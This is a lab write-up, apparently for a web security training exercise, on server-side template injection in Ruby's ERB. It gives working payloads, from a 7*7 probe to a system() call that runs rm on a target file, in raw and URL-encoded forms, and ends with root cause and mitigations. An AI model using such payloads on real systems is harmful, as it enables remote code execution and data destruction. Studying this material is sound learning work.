Basic Server-Side Template Injection (SSTI) – ERB
Lab Difficulty: Practitioner
Vulnerability Type: Server-Side Template Injection (SSTI) / Remote Code Execution

Summary
This lab demonstrates a server-side template injection (SSTI) vulnerability caused by unsafe handling of user-supplied input within an ERB template. ERB is a templating engine used in Ruby, and when user input is embedded directly into templates without proper sanitization, it can allow attackers to execute arbitrary Ruby code on the server. In this case, code execution is used to delete a file from another user’s home directory.

Objective
Exploit the ERB-based SSTI vulnerability to execute arbitrary code and delete the file /home/carlos/morale.txt.

Technical Walkthrough
1. Identify Injection Point
Upon exploring the application, clicking on a product that is out of stock displays a message:

kotlin
Copy
Edit
Unfortunately this product is out of stock
The message is controlled by the message parameter in the URL, for example:

perl
Copy
Edit
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock
This suggests that user input is being rendered directly into a server-side ERB template.

2. Test for Server-Side Template Injection
Referencing ERB documentation, the syntax <%= some_expression %> is used to evaluate Ruby expressions and print the result.

To test code execution, a harmless expression such as 7 * 7 is used:

matlab
Copy
Edit
<%= 7*7 %>
This is URL-encoded as:

perl
Copy
Edit
<%25%3d+7*7+%25>
Final payload:

perl
Copy
Edit
GET /?message=<%25%3d+7*7+%25>
The response renders 49 instead of the message, confirming the presence of SSTI.

3. Execute Arbitrary System Command
Consulting Ruby documentation, the system() method can be used to execute shell commands.

Construct the payload to delete the target file:

perl
Copy
Edit
<%= system("rm /home/carlos/morale.txt") %>
URL-encoded payload:

perl
Copy
Edit
<%25+system("rm+/home/carlos/morale.txt")+%25>
Final URL:

perl
Copy
Edit
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
Accessing this URL triggers execution of the rm command, which deletes the target file.

Result
Successfully solved the lab by exploiting a server-side template injection vulnerability. Arbitrary Ruby code was executed via an ERB template, which allowed deletion of the sensitive file /home/carlos/morale.txt.

Root Cause
The application rendered user input directly into a server-side ERB template without sanitization. This allowed injection of Ruby code into the template, which the server evaluated during rendering.

Mitigation
To prevent server-side template injection:

Never interpolate unsanitized user input into server-side templates.

Use template rendering engines that do not support code execution when working with user input.

Prefer context-aware encoding and sanitization methods.

Implement input validation and allow only expected values.

Use secure templating engines (e.g., escaping-based) or sandboxed environments.
